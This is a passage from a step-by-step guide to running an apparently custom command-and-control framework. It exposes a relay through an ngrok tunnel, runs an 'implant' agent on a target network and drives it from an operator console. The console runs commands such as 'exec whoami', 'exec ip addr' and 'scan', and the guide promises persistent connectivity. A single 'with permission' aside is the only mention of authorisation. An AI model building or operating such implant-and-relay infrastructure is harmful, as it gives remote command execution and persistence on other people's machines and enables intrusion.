Step 8: RUN IT! 🚀

```bash
# 1. Install ngrok and authenticate (if first time)
ngrok authtoken YOUR_AUTH_TOKEN  # Get from https://dashboard.ngrok.com

# 2. Run the complete setup
python3 start_eternal_eye.py
```

Step 9: Test the System

In Terminal 1 (Relay + Ngrok):

```bash
python3 start_eternal_eye.py
```

In Terminal 2 (Implant - ON TARGET NETWORK WITH PERMISSION):

```bash
# Use the implant connection info from the ngrok output
python3 implant/agent.py --relay YOUR_NGROK_HOST --port YOUR_NGROK_PORT
```

In Terminal 3 (Controller):

```bash
# Use the operator connection info from the ngrok output  
python3 controller/client.py --relay YOUR_NGROK_HOST --port YOUR_NGROK_PORT
```

Step 10: Try These Commands in Controller:

```
list
use 1
exec whoami
exec ip addr
scan 127.0.0.1
info
```

🎯 What You'll See:

1. Ngrok gives you public URLs that route to your local relay
2. Implants connect through ngrok tunnel
3. You control everything through the operator interface
4. Persistent connectivity even when you change networks

The ngrok tunnels will look like: 0.tcp.ngrok.io:12345 - these are your public endpoints that both implants and operators can connect to!
